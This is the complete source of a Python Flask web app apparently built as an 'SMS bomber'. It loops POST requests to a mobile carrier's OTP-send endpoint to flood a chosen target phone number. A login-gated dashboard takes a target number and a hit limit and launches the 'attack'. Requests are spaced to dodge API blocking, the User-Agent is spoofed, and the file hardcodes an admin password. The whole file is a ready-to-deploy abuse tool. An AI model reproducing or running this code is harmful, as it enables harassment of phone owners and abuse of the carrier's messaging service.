import requests, threading, os, time, sqlite3, random
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [AUTO WAKEUP & FIXED API] ----------
# রেন্ডার লিঙ্কটি এখানে দিয়ে দিন
APP_URL = "https://rk-bomb.onrender.com"

def self_ping():
    while True:
        try:
            requests.get(APP_URL, timeout=10)
        except: pass
        time.sleep(600) # ১০ মিনিট পর পর সার্ভারকে জাগিয়ে রাখবে

threading.Thread(target=self_ping, daemon=True).start()

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v24_final.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, total INTEGER, start_time TEXT, run_time TEXT, date TEXT)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?)", ("admin", generate_password_hash("JaNiNaTo-330")))
        except: pass

init_db()

# ---------- [CORE ENGINE WITH ROBI API] ----------
active_sessions = {}

def send_robi_otp(phone):
    url = "https://da-api.robi.com.bd/da-nll/otp/send"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
    }
    # নাম্বার ফরম্যাট ঠিক করা (018...)
    if phone.startswith("+88"): phone = phone[3:]
    elif phone.startswith("88"): phone = phone[2:]
    
    data = {"msisdn": phone}
    try:
        res = requests.post(url, headers=headers, json=data, timeout=7)
        return res.status_code == 200
    except:
        return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    
    while key in active_sessions:
        s = active_sessions[key]
        if s['total'] >= limit or s['status'] == 'Stopped': break
        
        if s['status'] == 'Running':
            # টাইম আপডেট
            now = datetime.now()
            diff = now - start_dt
            active_sessions[key]['run_time'] = str(diff).split('.')[0]
            
            # এসএমএস পাঠানো
            if send_robi_otp(phone):
                active_sessions[key]['success'] += 1
            
            active_sessions[key]['total'] += 1
            # স্পিড কন্ট্রোল (মিনিমাম ১ সেকেন্ড গ্যাপ যেন এপিআই ব্লক না হয়)
            time.sleep(1.2) 
        else:
            time.sleep(1)

    # হিস্ট্রি সেভ
    final = active_sessions.get(key)
    if final:
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, total, start_time, run_time, date) VALUES (?,?,?,?,?,?,?)",
                (username, phone, final['success'], final['total'], final['start_time'], final['run_time'], start_dt.strftime("%d/%m/%Y")))
        del active_sessions[key]

# ---------- [STYLED UI LAYOUT] ----------
LAYOUT = '''
<!DOCTYPE html>
<html>
<head>
    <title>RK-V24 MONITOR</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #050505; --red: #ff003c; --blue: #00d2ff; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; padding: 10px; overflow-x: hidden; }
        
        .rk-card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 15px; padding: 20px; margin-bottom: 20px; border-left: 5px solid var(--neon); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { font-family: 'Orbitron'; color: var(--neon); text-align: center; font-size: 18px; margin-bottom: 20px; }
        
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 8px; outline: none; box-sizing: border-box; }
        .btn-launch { width: 100%; padding: 15px; background: linear-gradient(45deg, var(--neon), var(--blue)); border: none; border-radius: 10px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; color: #000; transition: 0.3s; }
        .btn-launch:active { transform: scale(0.98); }

        .monitor { background: #000; border: 1px solid #222; border-radius: 12px; padding: 15px; margin-top: 15px; position: relative; border-top: 2px solid var(--blue); }
        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 10px 0; }
        .stat-item { background: #0f0f0f; padding: 8px; border-radius: 6px; text-align: center; border: 1px solid #1a1a1a; }
        .label { font-size: 10px; color: #666; text-transform: uppercase; display: block; }
        .value { font-family: 'Orbitron'; font-size: 13px; color: var(--blue); }
        
        .progress-bar { height: 5px; background: #111; border-radius: 5px; margin-top: 10px; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--neon); width: 0%; transition: 0.5s; box-shadow: 0 0 8px var(--neon); }
        
        .nav { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #222; margin-bottom: 15px; }
        .c-neon { color: var(--neon); } .c-red { color: var(--red); }
    </style>
</head>
<body>
    <div class="nav">
        <div style="font-family:'Orbitron'; color:var(--neon); font-size:14px;">RK-V24 MONITOR</div>
        <a href="/logout" style="color:var(--red); text-decoration:none; font-size:12px; font-weight:bold;">[ LOGOUT ]</a>
    </div>

    <div class="container">
        [CONTENT]
    </div>

    <script>
        function updateMonitor() {
            let container = document.getElementById('monitor-area');
            if(!container) return;
            fetch('/api/status').then(r => r.json()).then(data => {
                let html = '';
                for(let k in data) {
                    let s = data[k];
                    let per = (s.total / s.limit) * 100;
                    html += `
                    <div class="monitor">
                        <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-size:13px;">
                            <span class="c-neon">⚡ ${s.phone}</span>
                            <span style="color:orange;">STATUS: ${s.status}</span>
                        </div>
                        <div class="stat-grid">
                            <div class="stat-item"><span class="label">Start Time</span><span class="value">${s.start_time}</span></div>
                            <div class="stat-item"><span class="label">Run Time</span><span class="value">${s.run_time}</span></div>
                            <div class="stat-item"><span class="label">Success</span><span class="value c-neon">${s.success}</span></div>
                            <div class="stat-item"><span class="label">Roaming</span><span class="value">ACTIVE</span></div>
                        </div>
                        <div class="progress-bar"><div class="progress-fill" style="width:${per}%"></div></div>
                        <button onclick="location.href='/api/stop?num=${s.phone}'" style="width:100%; margin-top:12px; background:rgba(255,0,60,0.1); border:1px solid var(--red); color:var(--red); padding:8px; border-radius:6px; font-size:11px; cursor:pointer; font-family:'Orbitron';">TERMINATE MISSION</button>
                    </div>`;
                }
                container.innerHTML = html;
            });
        }
        setInterval(updateMonitor, 1500);
    </script>
</body>
</html>
'''

# ---------- [FLASK ROUTES] ----------

@app.route('/')
def dashboard():
    if 'user' not in session: return redirect('/login')
    content = '''
    <div class="rk-card">
        <h2>🚀 MISSION CONTROL</h2>
        <form action="/api/start">
            <input name="num" type="tel" placeholder="Target Number (018...)" required>
            <input name="amt" type="number" placeholder="Hit Limit (e.g. 50)" required>
            <button class="btn-launch">LAUNCH ATTACK</button>
        </form>
    </div>
    <div id="monitor-area"></div>
    '''
    return render_template_string(LAYOUT.replace('[CONTENT]', content))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect('/')
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="rk-card" style="margin-top:50px;"><h2>SYSTEM AUTH</h2><form method="POST"><input name="u" placeholder="Operator ID"><input name="p" type="password" placeholder="Access Key"><button class="btn-launch">ACCESS SYSTEM</button></form></div>'))

@app.route('/api/start')
def api_start():
    u = session.get('user')
    num = request.args.get('num')
    amt = int(request.args.get('amt') or 0)
    if u and num:
        start_dt = datetime.now()
        key = f"{u}_{num}"
        active_sessions[key] = {
            'phone': num, 'success': 0, 'total': 0, 'limit': amt, 
            'status': 'Running', 'start_time': start_dt.strftime("%I:%M:%S %p"), 
            'run_time': '0:00:00'
        }
        threading.Thread(target=bombing_task, args=(u, num, amt, start_dt), daemon=True).start()
    return redirect('/')

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    return jsonify({k: v for k, v in active_sessions.items() if k.startswith(u)})

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__ == "__main__":
    # Render এর জন্য পোর্ট ম্যানেজমেন্ট
    port = int(os.environ.get("PORT", 54300))
    app.run(host='0.0.0.0', port=port)
